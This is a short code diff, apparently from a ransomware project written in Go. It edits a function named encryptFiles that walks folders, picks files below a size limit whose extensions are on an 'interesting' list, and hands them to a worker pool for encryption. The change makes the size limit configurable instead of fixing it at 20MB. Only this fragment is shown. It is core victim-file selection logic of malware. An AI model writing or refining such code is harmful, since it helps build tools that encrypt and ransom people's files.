@@ -132,8 +132,8 @@ func encryptFiles() {
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
 				ext := filepath.Ext(path)
 
-				// If the file is not a folder and have a size lower than 20MB
-				if !f.IsDir() && f.Size() < (20*1e+6) {
+				// If the file is not a folder and have a size lower than the max specified
+				if !f.IsDir() && f.Size() <= cmd.MaxFileSize {
 					// Matching extensions
 					if utils.StringInSlice(strings.ToLower(ext[1:]), cmd.InterestingExtensions) {
 						// Each file is processed by a free worker on the pool
